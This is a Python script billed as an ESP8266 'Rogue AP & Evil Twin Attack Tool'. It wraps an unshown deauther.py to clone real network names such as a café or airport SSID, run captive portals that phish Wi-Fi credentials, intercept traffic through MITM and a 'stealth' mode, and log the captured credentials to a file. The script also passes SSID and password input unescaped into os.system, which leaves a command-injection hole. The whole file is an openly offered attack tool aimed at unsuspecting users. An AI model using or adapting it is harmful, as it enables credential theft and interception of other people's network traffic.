import argparse
import os
import time

# -------------------------------------------
# ESP8266 - Rogue AP & Evil Twin Attack Tool
# -------------------------------------------
# Features:
# - Creates a fake Wi-Fi Access Point (Evil Twin)
# - Captures credentials from unsuspecting users
# - Supports WPA2 passphrase capture & logging
# - Can clone a real network SSID for deception
# - Stealth mode: randomized MAC & beacon intervals
# - Supports captive portal for phishing credentials
# - Automatically logs captured credentials to a file
# - Enables MITM attack for intercepted network traffic
#
# Requirements:
# - ESP8266 / ESP-01S with Deauther firmware
# - Python 3.x
# - PySerial (for communication with ESP8266)
#
# Usage:
# 1. Start a Rogue AP with a custom SSID:
#    python esp8266_rogue_ap.py --ssid "Free WiFi" --password "fakepass123"
# 2. Clone an existing SSID for an Evil Twin Attack:
#    python esp8266_rogue_ap.py --clone "Starbucks_WiFi"
# 3. Enable stealth mode (randomized MAC & beacon interval):
#    python esp8266_rogue_ap.py --ssid "CorpWiFi" --stealth
# 4. Enable captive portal to capture credentials:
#    python esp8266_rogue_ap.py --ssid "Airport_WiFi" --captive-portal
# 5. Enable MITM attack to intercept network traffic:
#    python esp8266_rogue_ap.py --ssid "CorpWiFi" --mitm
# -------------------------------------------

def start_rogue_ap(ssid, password=None, stealth=False, captive_portal=False, mitm=False):
    """Starts a Rogue Wi-Fi Access Point (Evil Twin)."""
    print(f"[+] Starting Rogue AP: {ssid}...")
    command = f"python deauther.py rogue-ap --ssid '{ssid}'"
    if password:
        command += f" --password '{password}'"
    if stealth:
        command += " --stealth"
    if captive_portal:
        command += " --captive-portal"
    if mitm:
        command += " --mitm"
    os.system(command)
    print("[✔] Rogue AP started successfully.")
    if captive_portal:
        log_credentials()

def clone_network(real_ssid, stealth=False, captive_portal=False, mitm=False):
    """Clones an existing Wi-Fi network for an Evil Twin attack."""
    print(f"[+] Cloning SSID: {real_ssid}...")
    command = f"python deauther.py evil-twin --clone '{real_ssid}'"
    if stealth:
        command += " --stealth"
    if captive_portal:
        command += " --captive-portal"
    if mitm:
        command += " --mitm"
    os.system(command)
    print("[✔] Evil Twin AP running.")
    if captive_portal:
        log_credentials()

def log_credentials():
    """Logs captured credentials from the Rogue AP."""
    print("[+] Logging captured credentials...")
    os.system("python deauther.py log-credentials > credentials.txt")
    print("[✔] Credentials saved to credentials.txt")

def main():
    parser = argparse.ArgumentParser(description="ESP8266 - Rogue AP & Evil Twin Attack Tool")
    parser.add_argument("--ssid", type=str, help="SSID name for the Rogue AP")
    parser.add_argument("--password", type=str, help="Password for WPA2 Rogue AP")
    parser.add_argument("--clone", type=str, help="Clone an existing SSID for Evil Twin attack")
    parser.add_argument("--stealth", action='store_true', help="Enable stealth mode with randomized MAC & beacon intervals")
    parser.add_argument("--captive-portal", action='store_true', help="Enable captive portal for credential phishing")
    parser.add_argument("--mitm", action='store_true', help="Enable MITM attack to intercept traffic")
    args = parser.parse_args()

    if args.ssid:
        start_rogue_ap(args.ssid, args.password, args.stealth, args.captive_portal, args.mitm)
    elif args.clone:
        clone_network(args.clone, args.stealth, args.captive_portal, args.mitm)
    else:
        print("[!] No valid command provided. Use --help for options.")

if __name__ == "__main__":
    main()
